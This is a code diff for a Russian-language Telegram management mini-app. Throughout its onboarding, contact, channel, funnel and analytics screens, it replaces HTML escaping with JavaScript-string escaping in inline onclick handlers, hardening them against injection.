@@ -9607,7 +9607,7 @@ async function onboardFirstAction() {
 // ради бота, первым шагом больше не предлагают аккаунт и прокси.
 function _onboardGoalCard(d) {
   const btns = (d.goals||[]).map(g =>
-    `<button class="btn ${g.key===d.goal?'btn-p':'btn-s'}" style="display:block;width:100%;text-align:left;margin-top:8px;padding:10px 12px" onclick="onboardSetGoal('${esc(g.key)}')">
+    `<button class="btn ${g.key===d.goal?'btn-p':'btn-s'}" style="display:block;width:100%;text-align:left;margin-top:8px;padding:10px 12px" onclick="onboardSetGoal('${escJs(g.key)}')">
       <div style="font-size:13px;font-weight:700">${esc(g.title)}</div>
       <div style="font-size:12px;opacity:.75;margin-top:2px;line-height:1.35;white-space:normal">${esc(g.desc)}</div>
     </button>`).join('');
@@ -9674,7 +9674,7 @@ async function loadOnboarding() {
     // У закрытого шага кнопки нет, кроме «Оформить» на идущем триале.
     const showCta = act && s.cta && (!s.done || s.id === 'plan');
     const cta = !showCta ? '' :
-      `<button class="btn ${s.done?'btn-s':'btn-p'}" style="flex:0 0 auto;padding:6px 12px;font-size:12px" onclick="onboardStep('${esc(act.kind)}'${prmArg})">${esc(s.cta||'Открыть')} →</button>`;
+      `<button class="btn ${s.done?'btn-s':'btn-p'}" style="flex:0 0 auto;padding:6px 12px;font-size:12px" onclick="onboardStep('${escJs(act.kind)}'${prmArg})">${esc(s.cta||'Открыть')} →</button>`;
     const showHint = !s.done || s.id === 'plan';
     return `<div style="display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-top:1px solid var(--sep)">
       <div style="font-size:15px;line-height:1.4;width:16px;text-align:center;flex:0 0 auto">${mark}</div>
@@ -9727,9 +9727,9 @@ async function loadOrganismPulse() {
               <div style="font-size:13px;font-weight:600">${sv.e} ${esc(s.title)}</div>
               <div style="font-size:12px;color:var(--hint);margin-top:2px;line-height:1.4">${esc(s.why)}</div>
             </div>
-            <span class="icon-tap" onclick="dismissPulse('${esc(s.id)}')" style="color:var(--hint);font-size:13px" role="button" tabindex="0" aria-label="Закрыть">✕</span>
+            <span class="icon-tap" onclick="dismissPulse('${escJs(s.id)}')" style="color:var(--hint);font-size:13px" role="button" tabindex="0" aria-label="Закрыть">✕</span>
           </div>
-          <button class="btn btn-s" style="margin-top:8px;font-size:12px;padding:6px 12px" onclick="runPulseActionById('${esc(_pulseKeep(s))}')">▶ ${esc(pulseActionLabel(s.action))}</button>
+          <button class="btn btn-s" style="margin-top:8px;font-size:12px;padding:6px 12px" onclick="runPulseActionById('${escJs(_pulseKeep(s))}')">▶ ${esc(pulseActionLabel(s.action))}</button>
         </div>`;
       }).join('');
       html += '</div>';
@@ -9836,7 +9836,7 @@ async function openDigest() {
         return `<div style="border-left:3px solid ${sv.c};background:var(--bg2);border-radius:0 10px 10px 0;padding:9px 12px">
           <div style="font-size:13px;font-weight:600">${sv.e} ${esc(s.title)}</div>
           <div style="font-size:12px;color:var(--hint);margin-top:2px;line-height:1.4">${esc(s.why)}</div>
-          <button class="btn btn-s" style="margin-top:8px;font-size:12px;padding:6px 12px" onclick="runPulseActionById('${esc(_pulseKeep(s))}')">▶ ${esc(pulseActionLabel(s.action))}</button>
+          <button class="btn btn-s" style="margin-top:8px;font-size:12px;padding:6px 12px" onclick="runPulseActionById('${escJs(_pulseKeep(s))}')">▶ ${esc(pulseActionLabel(s.action))}</button>
         </div>`;
       }).join('');
       h += '</div>';
@@ -12070,7 +12070,7 @@ function buildAccDetail(d) {
     <div class="profile-hdr">
       <div class="profile-ava ${avatarCls}">${initials}</div>
       <div class="profile-name">${esc(name)}</div>
-      ${a.username?`<div class="profile-sub" style="cursor:pointer;color:var(--accent)" onclick="openTgUser('${esc(a.username)}')" role="button" tabindex="0">@${esc(a.username)} ↗</div>`:''}
+      ${a.username?`<div class="profile-sub" style="cursor:pointer;color:var(--accent)" onclick="openTgUser('${escJs(a.username)}')" role="button" tabindex="0">@${esc(a.username)} ↗</div>`:''}
       <div class="profile-badges">${statusBadge}</div>
     </div>
     ${healthBanner}
@@ -12473,12 +12473,12 @@ function buildChDetail(d) {
     <div class="profile-hdr">
       <div class="profile-ava pava-purple">${initials}</div>
       <div class="profile-name">${esc(name)}</div>
-      ${c.username?`<div class="profile-sub" style="cursor:pointer;color:var(--accent)" onclick="openTgUser('${esc(c.username)}')" role="button" tabindex="0">@${esc(c.username)} ↗</div>`:''}
+      ${c.username?`<div class="profile-sub" style="cursor:pointer;color:var(--accent)" onclick="openTgUser('${escJs(c.username)}')" role="button" tabindex="0">@${esc(c.username)} ↗</div>`:''}
       <div class="profile-badges"><span class="badge b-bl">${type}</span></div>
     </div>
 
     <div class="actions" style="display:flex;gap:8px;flex-wrap:wrap">
-      ${c.username?`<button class="btn btn-s" onclick="openTgUser('${esc(c.username)}')" style="flex:1 1 auto;min-width:88px" title="Открыть канал в Telegram">↗ Открыть в Telegram</button>`:''}
+      ${c.username?`<button class="btn btn-s" onclick="openTgUser('${escJs(c.username)}')" style="flex:1 1 auto;min-width:88px" title="Открыть канал в Telegram">↗ Открыть в Telegram</button>`:''}
       <button class="btn btn-p" onclick="openChPostModal(${c.channel_id})" style="flex:1 1 auto;min-width:88px">📝 Опубликовать</button>
       <button class="btn btn-s" onclick="pinLastPost(${c.channel_id})" style="flex:1 1 auto;min-width:88px">📌 Закрепить пост</button>
       <button class="btn btn-s" onclick="openChanEdit(${c.channel_id})" style="flex:1 1 auto;min-width:88px">✏️ Изменить</button>
@@ -12505,7 +12505,7 @@ function buildChDetail(d) {
       </div>
       ${c.username?`<div class="row">
         <div class="row-ico" style="background:var(--bg-green-16)">🔗</div>
-        <div class="row-body" onclick="openTgUser('${esc(c.username)}')" style="cursor:pointer"><div class="row-name">Ссылка</div><div class="row-val" style="color:var(--accent)">t.me/${esc(c.username)} ↗</div></div>
+        <div class="row-body" onclick="openTgUser('${escJs(c.username)}')" style="cursor:pointer"><div class="row-name">Ссылка</div><div class="row-val" style="color:var(--accent)">t.me/${esc(c.username)} ↗</div></div>
         <div class="row-right" onclick="copyToClipboard('https://t.me/${esc(c.username)}')"><span style="font-size:20px;cursor:pointer">📋</span></div>
       </div>`:''}
       ${c.channel_id?`<div class="row"><div class="row-ico" style="background:rgba(113,113,122,.16)">🆔</div>
@@ -12736,7 +12736,7 @@ function renderCmps(items) {
 function renderFuns(items) {
   const el = document.getElementById('funList');
   if (!items.length) { el.innerHTML=empty('🔄','Нет воронок'); return; }
-  el.innerHTML = items.map(f=>`<div class="li tap" onclick="openFunnelDetail(${f.id},'${esc((f.name||'Воронка').replace(/'/g,''))}')">
+  el.innerHTML = items.map(f=>`<div class="li tap" onclick="openFunnelDetail(${f.id},'${escJs(f.name||'Воронка')}')">
     <div class="ava ava-orange">🔄</div>
     <div class="li-body">
       <div class="li-name">${esc(f.name||'Воронка')}</div>
@@ -14088,7 +14088,7 @@ async function saveFunnel() {
     const d = await api('/api/miniapp/bot/'+FUNNEL_SAVE_BOT+'/funnels');
     const fns = d.funnels||[];
     if (!fns.length) { txt('bfList', empty('🔄','Нет воронок')); return; }
-    document.getElementById('bfList').innerHTML = fns.map(f=>`<div class="li tap" onclick="openFunnelDetail(${f.id},'${esc(f.name||'Воронка')}')">
+    document.getElementById('bfList').innerHTML = fns.map(f=>`<div class="li tap" onclick="openFunnelDetail(${f.id},'${escJs(f.name||'Воронка')}')">
       <div class="ava ava-orange">🔄</div>
       <div class="li-body">
         <div class="li-name">${esc(f.name||'Воронка')}</div>
@@ -14253,7 +14253,7 @@ async function loadCRM(append) {
     if (!append && (d.all_tags||[]).length) {
       document.getElementById('crmTagsBar').innerHTML =
         `<span class="badge ${!CRM_TAG?'b-bl':'b-gy'}" style="cursor:pointer;padding:5px 10px" onclick="setCRMTag('')">Все</span>` +
-        d.all_tags.map(t=>`<span class="badge ${CRM_TAG===t?'b-bl':'b-gy'}" style="cursor:pointer;padding:5px 10px;min-height:30px;display:inline-flex;align-items:center;white-space:nowrap" onclick="setCRMTag('${esc(t)}')">#${esc(t)}</span>`).join('');
+        d.all_tags.map(t=>`<span class="badge ${CRM_TAG===t?'b-bl':'b-gy'}" style="cursor:pointer;padding:5px 10px;min-height:30px;display:inline-flex;align-items:center;white-space:nowrap" onclick="setCRMTag('${escJs(t)}')">#${esc(t)}</span>`).join('');
     }
     const contacts = d.contacts||[];
     if (!contacts.length && !append) {
@@ -14589,7 +14589,7 @@ async function loadTemplates() {
           <div class="li-sub">${esc(txt2)}${txt2.length===60?'…':''}</div>
         </div>
         <div class="li-right">
-          <span class="icon-btn sm accent" role="button" tabindex="0" aria-label="Применить шаблон" onclick="useTpl(${t.id},'${esc(t.name||'')}','${esc((t.template?.text||'').replace(/'/g,"&#39;"))}')">📤</span>
+          <span class="icon-btn sm accent" role="button" tabindex="0" aria-label="Применить шаблон" onclick="useTpl(${t.id},'${escJs(t.name||'')}','${escJs(t.template?.text||'')}')">📤</span>
           <span class="icon-btn sm danger" role="button" tabindex="0" aria-label="Удалить шаблон" onclick="deleteTpl(${t.id}, this)">🗑</span>
         </div>
       </div>`;
@@ -17131,7 +17131,7 @@ async function openInfra() {
     // аккаунта было нечем, среза под пул на сервере не существовало.
     txt('infraPools', pools.length ? pools.map(p=>{
       const name = p.pool || 'default';
-      return `<div class="row tap" onclick="healthGoAccounts('all','','${esc(name)}')" role="button" tabindex="0">
+      return `<div class="row tap" onclick="healthGoAccounts('all','','${escJs(name)}')" role="button" tabindex="0">
         <div class="row-body"><div class="row-name">Пул: ${esc(name)}</div></div>
         <div class="row-right">${num(p.cnt)} ${plural(p.cnt,'аккаунт','аккаунта','аккаунтов')} \u203a</div></div>`;
     }).join('') : empty('📦','Пулы не заданы','Пул — это группа аккаунтов: назначается на карточке аккаунта и делит флот по назначению',
@@ -18439,7 +18439,7 @@ async function loadContacts(append=false) {
         c.is_mutual ? '↔ взаимный' : '',
         lastSeenLabel(c.last_seen_type, c.last_seen_at),
       ].filter(Boolean).join(' · ');
-      const sel = CONTACT_SELECT_MODE ? `onclick="event.stopPropagation();toggleContactCheck('${esc(c.id)}',this)" style="border:2px solid transparent;border-radius:14px"` : '';
+      const sel = CONTACT_SELECT_MODE ? `onclick="event.stopPropagation();toggleContactCheck('${escJs(c.id)}',this)" style="border:2px solid transparent;border-radius:14px"` : '';
       return `<div class="li tap" ${sel} onclick="${CONTACT_SELECT_MODE?'':'openContactDetail(\''+esc(c.id)+'\')'}">
         <div class="ava" style="background:${c.color_label||'rgba(96,165,250,.16)'};color:var(--text)">${c.is_premium?'💎':'👤'}</div>
         <div class="li-body">
@@ -18486,7 +18486,7 @@ async function contactSuggest(q) {
       const sub = [r.username ? '@' + r.username : '', r.company || '',
                    (r.tags || []).map(x => '#' + x).join(' ')]
                   .filter(Boolean).join(' · ');
-      return `<div class="li tap" onclick="openContactDetail('${esc(r.id)}')">
+      return `<div class="li tap" onclick="openContactDetail('${escJs(r.id)}')">
         <div class="ava" style="background:rgba(96,165,250,.16);color:var(--text)">👤</div>
         <div class="li-body">
           <div class="li-name">${esc(r.name)}</div>
@@ -18661,10 +18661,10 @@ async function openContactDetail(id) {
       ${c.trust_score?`<div class="row"><div class="row-body"><div class="row-name">Доверие</div><div class="row-val">${Math.round((c.trust_score||0)*100)}%</div></div></div>`:''}
     </div>`;
     html += `<div style="padding:8px 16px;display:flex;gap:6px;flex-wrap:wrap">
-      <button class="btn btn-s" onclick="copyText('${esc(c.username||'')}')" style="flex:0 0 auto">📋 Юзернейм</button>
+      <button class="btn btn-s" onclick="copyText('${escJs(c.username||'')}')" style="flex:0 0 auto">📋 Юзернейм</button>
       <button class="btn btn-s" onclick="copyText('${c.telegram_user_id||''}')" style="flex:0 0 auto">📋 ID</button>
-      ${c.phones&&c.phones.length?`<button class="btn btn-s" onclick="copyText('${esc(c.phones[0])}')" style="flex:0 0 auto">📋 Тел.</button>`:''}
-      ${c.emails&&c.emails.length?`<button class="btn btn-s" onclick="copyText('${esc(c.emails[0])}')" style="flex:0 0 auto">📋 Почта</button>`:''}
+      ${c.phones&&c.phones.length?`<button class="btn btn-s" onclick="copyText('${escJs(c.phones[0])}')" style="flex:0 0 auto">📋 Тел.</button>`:''}
+      ${c.emails&&c.emails.length?`<button class="btn btn-s" onclick="copyText('${escJs(c.emails[0])}')" style="flex:0 0 auto">📋 Почта</button>`:''}
       <button class="btn btn-s" id="cdExclBtn" onclick="cdToggleExclude(${c.excluded?'false':'true'})" style="flex:0 0 auto">${c.excluded?'↩️ Вернуть в работу':'🙈 Личный (вне работы)'}</button>
     </div>`;
     html += `<div style="padding:4px 16px 8px;display:flex;gap:6px;flex-wrap:wrap">
@@ -19438,7 +19438,7 @@ async function openContactRelationships(id) {
     rels.forEach(r=>{
       // Вторая сторона пары: таблица хранит a/b, «другой» — тот, кто не этот контакт.
       const other = (String(r.contact_a_id)===String(id)) ? r.contact_b_id : r.contact_a_id;
-      const open = other ? ` onclick="openContactDetail('${esc(other)}')" role="button" tabindex="0"` : '';
+      const open = other ? ` onclick="openContactDetail('${escJs(other)}')" role="button" tabindex="0"` : '';
       html += `<div class="li${other?' tap':''}"${open}><div class="li-body"><div class="li-name">${esc(r.related_contact_name||'Без имени')}${r.related_is_premium?' 💎':''}</div><div class="li-sub wrap">${esc(uchRelRu(r.relationship_type))} · уверенность ${Math.round((r.strength||0)*100)}%${uchRelHint(r.relationship_type)?' · '+esc(uchRelHint(r.relationship_type)):''}</div></div>${other?'<span class="chev">›</span>':''}</div>`;
     });
     html += `<div class="sec" style="margin-top:12px">Весь граф</div>
@@ -19731,8 +19731,8 @@ async function openUchConflicts() {
     conflicts.forEach(c=>{
       html += `<div class="li" style="margin:0 16px 8px"><div class="li-body"><div class="li-name">${esc(c.first_name||'')} ${esc(c.last_name||'')} · ${esc(c.field_name)}</div><div class="li-sub">A: ${esc(c.value_a||'')} vs B: ${esc(c.value_b||'')}</div></div>
         <div class="li-right col" style="gap:4px">
-          <button class="btn btn-s" style="padding:3px 8px;font-size:11px" onclick="resolveConflict(${c.id},'accepted','${esc((c.value_a||'').replace(/'/g,"\\'"))}')">A</button>
-          <button class="btn btn-s" style="padding:3px 8px;font-size:11px" onclick="resolveConflict(${c.id},'accepted','${esc((c.value_b||'').replace(/'/g,"\\'"))}')">B</button>
+          <button class="btn btn-s" style="padding:3px 8px;font-size:11px" onclick="resolveConflict(${c.id},'accepted','${escJs(c.value_a||'')}')">A</button>
+          <button class="btn btn-s" style="padding:3px 8px;font-size:11px" onclick="resolveConflict(${c.id},'accepted','${escJs(c.value_b||'')}')">B</button>
         </div></div>`;
     });
     txt('confBody', html);
@@ -19978,12 +19978,12 @@ async function openContactGroups() {
       groups.forEach(g => {
         const cnt = Number(g.member_count || 0);
         html += `<div class="li">
-          <div class="li-body" onclick="cgOpenContacts(${Number(g.id)},'${esc(String(g.name||'')).replace(/'/g,"\\'")}')" role="button" tabindex="0">
+          <div class="li-body" onclick="cgOpenContacts(${Number(g.id)},'${escJs(String(g.name||''))}')" role="button" tabindex="0">
             <div class="li-name">${g.color?`<span style="display:inline-block;width:9px;height:9px;border-radius:50%;background:${esc(g.color)};margin-right:6px"></span>`:''}${esc(g.name||'Без названия')}</div>
             <div class="li-sub">${cnt ? 'Контактов: '+num(cnt) : 'пусто'}</div>
           </div>
           <div class="li-right" style="display:flex;gap:8px;align-items:center">
-            <span class="icon-tap" onclick="event.stopPropagation();cgRename(${Number(g.id)},'${esc(String(g.name||'')).replace(/'/g,"\\'")}')" role="button" tabindex="0" aria-label="Переименовать группу" title="Переименовать">✏️</span>
+            <span class="icon-tap" onclick="event.stopPropagation();cgRename(${Number(g.id)},'${escJs(String(g.name||''))}')" role="button" tabindex="0" aria-label="Переименовать группу" title="Переименовать">✏️</span>
             <span class="icon-tap" onclick="event.stopPropagation();cgDelete(${Number(g.id)},this)" role="button" tabindex="0" aria-label="Удалить группу" title="Удалить">🗑</span>
           </div>
         </div>`;
@@ -20824,11 +20824,11 @@ async function openUchGraph() {
     }
     const top = types.length ? types[0].relationship_type : '';
     let html = `<div style="padding:12px 16px">
-      <div class="kpi-card${top?' tap-card':''}" style="margin-bottom:12px"${top?` onclick="openUchGraphType('${esc(top)}')" role="button" tabindex="0"`:''}><div class="kpi-val">${num(total)}</div><div class="kpi-lbl">${plural(total,'Связь','Связи','Связей')} между контактами${top?' · нажмите, чтобы увидеть пары':''}</div></div>`;
+      <div class="kpi-card${top?' tap-card':''}" style="margin-bottom:12px"${top?` onclick="openUchGraphType('${escJs(top)}')" role="button" tabindex="0"`:''}><div class="kpi-val">${num(total)}</div><div class="kpi-lbl">${plural(total,'Связь','Связи','Связей')} между контактами${top?' · нажмите, чтобы увидеть пары':''}</div></div>`;
     if (types.length) {
       html += '<div class="sec">По типам — нажмите, чтобы увидеть пары</div>';
       types.forEach(t=>{
-        html += `<div class="li tap" onclick="openUchGraphType('${esc(t.relationship_type)}')" role="button" tabindex="0"><div class="li-body"><div class="li-name">${esc(uchRelRu(t.relationship_type))}</div><div class="li-sub wrap">${num(t.cnt)} ${plural(t.cnt,'связь','связи','связей')}${uchRelHint(t.relationship_type)?' · '+esc(uchRelHint(t.relationship_type)):''}</div></div><span class="chev">›</span></div>`;
+        html += `<div class="li tap" onclick="openUchGraphType('${escJs(t.relationship_type)}')" role="button" tabindex="0"><div class="li-body"><div class="li-name">${esc(uchRelRu(t.relationship_type))}</div><div class="li-sub wrap">${num(t.cnt)} ${plural(t.cnt,'связь','связи','связей')}${uchRelHint(t.relationship_type)?' · '+esc(uchRelHint(t.relationship_type)):''}</div></div><span class="chev">›</span></div>`;
       });
     }
     if (d.strongest&&d.strongest.length) {
@@ -20860,8 +20860,8 @@ function _uchPairRow(r) {
   return `<div class="li" style="flex-direction:column;align-items:stretch">
     <div class="li-body" style="margin-bottom:8px"><div class="li-name">${esc(a)} ↔ ${esc(b)}</div><div class="li-sub wrap">${esc(uchRelRu(r.relationship_type))} · уверенность ${Math.round((r.strength||0)*100)}%${why?' · '+esc(why):''}</div></div>
     <div style="display:flex;gap:8px">
-      <span class="chip" style="flex:1 1 0;min-width:0" onclick="openContactDetail('${esc(String(r.contact_a_id||''))}')" role="button" tabindex="0">👤&nbsp;<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(a)}</span></span>
-      <span class="chip" style="flex:1 1 0;min-width:0" onclick="openContactDetail('${esc(String(r.contact_b_id||''))}')" role="button" tabindex="0">👤&nbsp;<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(b)}</span></span>
+      <span class="chip" style="flex:1 1 0;min-width:0" onclick="openContactDetail('${escJs(String(r.contact_a_id||''))}')" role="button" tabindex="0">👤&nbsp;<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(a)}</span></span>
+      <span class="chip" style="flex:1 1 0;min-width:0" onclick="openContactDetail('${escJs(String(r.contact_b_id||''))}')" role="button" tabindex="0">👤&nbsp;<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(b)}</span></span>
     </div>
   </div>`;
 }
@@ -21095,7 +21095,7 @@ function appendAiContacts(contacts) {
   const chat = document.getElementById('aiChat');
   let html = '<div style="margin-bottom:12px;padding:8px;background:var(--sep);border-radius:10px">';
   contacts.forEach(c=>{
-    html += `<div class="li tap" onclick="openContactDetail('${esc(c.id)}')" style="padding:6px 0">
+    html += `<div class="li tap" onclick="openContactDetail('${escJs(c.id)}')" style="padding:6px 0">
       <div class="li-body"><div class="li-name" style="font-size:13px">${esc(c.name)}</div></div>
       ${c.extra?`<div class="li-right"><span style="font-size:11px;color:var(--hint)">${esc(c.extra)}</span></div>`:''}
     </div>`;
@@ -21184,7 +21184,7 @@ async function openContactStats() {
       html += `<div class="sec" style="margin-top:8px">📡 По аккаунтам</div><div class="lst" style="margin:0 16px">`;
       accs.forEach(a=>{
         const nm = a.account_name || ('Аккаунт #'+a.account_id);
-        html += `<div class="row" onclick="csGoAccountContacts(${Number(a.account_id)},'${esc(nm).replace(/'/g,"\\'")}')" role="button" tabindex="0">
+        html += `<div class="row" onclick="csGoAccountContacts(${Number(a.account_id)},'${escJs(nm)}')" role="button" tabindex="0">
           <div class="row-body"><div class="row-name">${esc(nm)}</div><div class="row-val">${num(a.contact_count)} ${plural(a.contact_count,'контакт','контакта','контактов')}</div></div>
           <div class="row-right"><span class="chev">›</span></div></div>`;
       });
@@ -21702,13 +21702,13 @@ async function openNodes() {
     if (!nodes.length) { txt('nodesList', empty('🖥','Нет нод','Нажмите «+ Добавить», чтобы зарегистрировать форум-группу')); return; }
     txt('nodesList', nodes.map(n=>`
       <div class="row">
-        <div class="row-ico tap" style="background:var(--bg-green-16)" onclick="openNodeThreads(${n.id},'${esc(n.name||n.node_type)}')">${n.is_active?'🟢':'⚫'}</div>
-        <div class="row-body tap" onclick="openNodeThreads(${n.id},'${esc(n.name||n.node_type)}')">
+        <div class="row-ico tap" style="background:var(--bg-green-16)" onclick="openNodeThreads(${n.id},'${escJs(n.name||n.node_type)}')">${n.is_active?'🟢':'⚫'}</div>
+        <div class="row-body tap" onclick="openNodeThreads(${n.id},'${escJs(n.name||n.node_type)}')">
           <div class="row-name">${esc(n.name||'Node')} ${NODE_TYPE[n.node_type]||n.node_type||'—'}</div>
           <div class="row-val">${n.open_threads||0} открытых топиков · ${n.total_threads||0} всего</div>
         </div>
         <div class="row-right" style="display:flex;gap:6px;align-items:center">
-          <span class="chev icon-tap" onclick="openNodeThreads(${n.id},'${esc(n.name||n.node_type)}')" role="button" tabindex="0" aria-label="Открыть ветки">›</span>
+          <span class="chev icon-tap" onclick="openNodeThreads(${n.id},'${escJs(n.name||n.node_type)}')" role="button" tabindex="0" aria-label="Открыть ветки">›</span>
           <button class="btn btn-s" style="padding:5px 8px;font-size:12px;background:var(--bg-red-18);color:var(--red)" onclick="deleteNode(${n.id}, this)" aria-label="Удалить">🗑</button>
         </div>
       </div>
@@ -23446,7 +23446,7 @@ async function openVLayer() {
       html += '<div class="lst">' + cooling.slice(0, 30).map(c => {
         const who = c.name || _vlWho(c);
         const left = _vlDecayText({expires_at: c.expires_at});
-        return `<div class="row" onclick="openVLayerEntity('${esc(String(c.entity_type||'user'))}','${esc(c.entity_id)}')" style="cursor:pointer">
+        return `<div class="row" onclick="openVLayerEntity('${escJs(String(c.entity_type||'user'))}','${escJs(c.entity_id)}')" style="cursor:pointer">
           <div class="row-ico" style="background:var(--bg-orange-16,rgba(251,191,36,.16))">⏳</div>
           <div class="row-body"><div class="row-name">${esc(who)}</div>
             <div class="row-val">${esc(c.label)}${left ? ' · ' + esc(left) : ''} · история →</div></div>
@@ -23489,7 +23489,7 @@ async function openVLayer() {
                 : b.value === 'cold' ? 'var(--hint)' : 'var(--orange)';
         const ico = b.value === 'hot' ? '🔥' : b.value === 'cold' ? '🧊' : '🌤';
         const nm = b.name && b.name[0] === '@' ? b.name : '@' + b.name;
-        return `<div class="row" onclick="openVLayerEntity('bot','${esc(b.bot_id)}')" style="cursor:pointer">
+        return `<div class="row" onclick="openVLayerEntity('bot','${escJs(b.bot_id)}')" style="cursor:pointer">
           <div class="row-ico" style="background:var(--bg-orange-16,rgba(251,191,36,.16))">${ico}</div>
           <div class="row-body"><div class="row-name">${esc(nm)}</div>
             <div class="row-val" style="color:${c}">${esc(b.label)} · уверенность ${Math.round((b.confidence||0)*100)}%</div></div>
@@ -23515,7 +23515,7 @@ async function openVLayer() {
       // Заполненная ступень кликабельна → список тех самых людей (принцип
       // проекта: число обязано открываться срезом, а не оставаться числом).
       const tap = f.count
-        ? ` onclick="openVLayerSegment('${esc(f.value)}')" style="cursor:pointer;padding:7px 16px;${dim}"`
+        ? ` onclick="openVLayerSegment('${escJs(f.value)}')" style="cursor:pointer;padding:7px 16px;${dim}"`
         : ` style="padding:7px 16px;${dim}"`;
       const more = f.count ? ' <span style="color:var(--hint);font-weight:400">· кто это →</span>' : '';
       return `<div${tap}>
@@ -23537,7 +23537,7 @@ async function openVLayer() {
       // чтения — каждого можно было открыть, но «написать всем готовым» неоткуда.
       html += `<div style="padding:0 16px 8px"><button class="btn btn-p" style="width:100%" onclick="openContactsHot()">✍️ Написать оффер готовым</button></div>`;
       html += '<div class="lst">';
-      html += hot.slice(0, 20).map(h => `<div class="row" onclick="openVLayerEntity('${esc(String(h.entity_type||'user'))}','${esc(h.entity_id)}')" style="cursor:pointer">
+      html += hot.slice(0, 20).map(h => `<div class="row" onclick="openVLayerEntity('${escJs(String(h.entity_type||'user'))}','${escJs(h.entity_id)}')" style="cursor:pointer">
         <div class="row-ico" style="background:var(--bg-orange-16,rgba(251,191,36,.16))">🔥</div>
         <div class="row-body"><div class="row-name">${esc(h.name || _vlWho(h))}</div>
           <div class="row-val">${esc(h.label)} · уверенность ${Math.round((h.confidence||0)*100)}% · история →</div></div>
@@ -23553,11 +23553,11 @@ async function openVLayer() {
       html += '<div class="lst">';
       html += bouncing.slice(0, 30).map(b => `<div class="row">
         <div class="row-ico" style="background:var(--bg-orange-16,rgba(251,191,36,.16))">🔁</div>
-        <div class="row-body" onclick="openVLayerEntity('${esc(String(b.entity_type||'user'))}','${esc(b.entity_id)}')" style="cursor:pointer">
+        <div class="row-body" onclick="openVLayerEntity('${escJs(String(b.entity_type||'user'))}','${escJs(b.entity_id)}')" style="cursor:pointer">
           <div class="row-name">${esc(b.name || _vlWho(b))}</div>
           <div class="row-val">${b.label ? esc(b.label) + ' · ' : ''}история →</div></div>
         <button class="btn btn-s" style="flex:0 0 auto;padding:6px 10px;font-size:12px"
-          onclick="event.stopPropagation();vlMarkPurchased('${esc(b.entity_id)}', true)">✅ Купил</button>
+          onclick="event.stopPropagation();vlMarkPurchased('${escJs(b.entity_id)}', true)">✅ Купил</button>
       </div>`).join('');
       html += '</div>';
     }
@@ -23570,7 +23570,7 @@ async function openVLayer() {
     } else {
       html += '<div class="lst">' + events.map(e => {
         const open = e.entity_id
-          ? ` onclick="openVLayerEntity('${esc(String(e.entity_type||'user'))}','${esc(e.entity_id)}')" style="cursor:pointer"`
+          ? ` onclick="openVLayerEntity('${escJs(String(e.entity_type||'user'))}','${escJs(e.entity_id)}')" style="cursor:pointer"`
           : '';
         const who = e.entity_id ? (e.name || _vlWho(e)) : '';
         return `<div class="row"${open}>
@@ -23664,7 +23664,7 @@ async function openVLayerSegment(value) {
       html += '<div class="lst">' + people.map(p => {
         const who = p.name || _vlWho({entity_type: p.entity_type, entity_id: p.entity_id});
         const decay = _vlDecayText(p);
-        return `<div class="row" onclick="openVLayerEntity('${esc(String(p.entity_type||'user'))}','${esc(p.entity_id)}')" style="cursor:pointer">
+        return `<div class="row" onclick="openVLayerEntity('${escJs(String(p.entity_type||'user'))}','${escJs(p.entity_id)}')" style="cursor:pointer">
           <div class="row-body"><div class="row-name">${esc(who)}</div>
             <div class="row-val">уверенность ${Math.round((p.confidence||0)*100)}%${decay ? ' · ' + esc(decay) : ''} · история →</div></div>
         </div>`;
@@ -23702,12 +23702,12 @@ async function openVLayerEntity(entityType, entityId) {
     // человек виден, а открыть его карточку и написать неоткуда.
     if (entityType === 'user') {
       html += `<button class="btn btn-p" style="width:100%;margin-bottom:10px"
-        onclick="openContactDetail('${esc(entityId)}')">👤 Открыть карточку контакта</button>`;
+        onclick="openContactDetail('${escJs(entityId)}')">👤 Открыть карточку контакта</button>`;
       // Оплата часто проходит мимо системы — отметить покупку должно быть можно
       // прямо здесь, иначе модель так и будет считать покупателя «по кругу».
       if (cur.value !== 'purchased') {
         html += `<button class="btn btn-s" style="width:100%;margin-bottom:10px"
-          onclick="vlMarkPurchased('${esc(entityId)}', false)">✅ Отметить: купил</button>`;
+          onclick="vlMarkPurchased('${escJs(entityId)}', false)">✅ Отметить: купил</button>`;
       }
     }
     const tr = d.transitions || [];
@@ -23987,7 +23987,7 @@ async function openFolders(keep) {
                  : st==='failed' ? (f.error||'ошибка') : 'создаётся…';
       return `<div class="row" style="border-left:3px solid ${color}">
         <div class="row-ico" style="background:var(--bg2)">📁</div>
-        <div class="row-body" ${st==='ready'?`onclick="copyText('${esc(f.invite_link||'')}')" style="cursor:pointer"`:''}>
+        <div class="row-body" ${st==='ready'?`onclick="copyText('${escJs(f.invite_link||'')}')" style="cursor:pointer"`:''}>
           <div class="row-name">${esc(f.title)} · ${f.chat_count||0} ${plural(f.chat_count||0,'чат','чата','чатов')}${f.join_count?' · добавили '+f.join_count:''}</div>
           <div class="row-val" style="word-break:break-all">${esc(String(line).substring(0,90))}</div>
         </div>
@@ -24276,7 +24276,7 @@ async function openExperiments() {
       'Эксперимент показывает двум половинам пользователей разные тексты приветствия или авто-ответа и считает, какой сработал лучше',
       {label:'+ Создать эксперимент', fn:'openExpModal()'})); return; }
     txt('experimentsList', exps.map(e=>`
-      <div class="row tap" onclick="openExpDetail(${e.id},'${esc(e.name)}')">
+      <div class="row tap" onclick="openExpDetail(${e.id},'${escJs(e.name)}')">
         <div class="row-ico" style="background:var(--bg-yellow-16)">🧪</div>
         <div class="row-body">
           <div class="row-name">${esc(e.name)}</div>
@@ -24719,7 +24719,7 @@ async function openAdIntel() {
       txt('adIntelChannels', chs.map(c=>{
         const nm = c.title || (c.username ? '@'+c.username : 'Канал');
         return `
-      <div class="row${c.username?' tap':''}" ${c.username?`role="button" tabindex="0" onclick="openTgUser('${esc(c.username)}')"`:''}>
+      <div class="row${c.username?' tap':''}" ${c.username?`role="button" tabindex="0" onclick="openTgUser('${escJs(c.username)}')"`:''}>
         <div class="row-ico" style="background:var(--bg-yellow-16)">📺</div>
         <div class="row-body">
           <div class="row-name">${esc(nm)}</div>
@@ -24737,7 +24737,7 @@ async function openAdIntel() {
         chs.length ? null : {label:'➕ Добавить канал', fn:'openAdIntelModal()'}));
     } else {
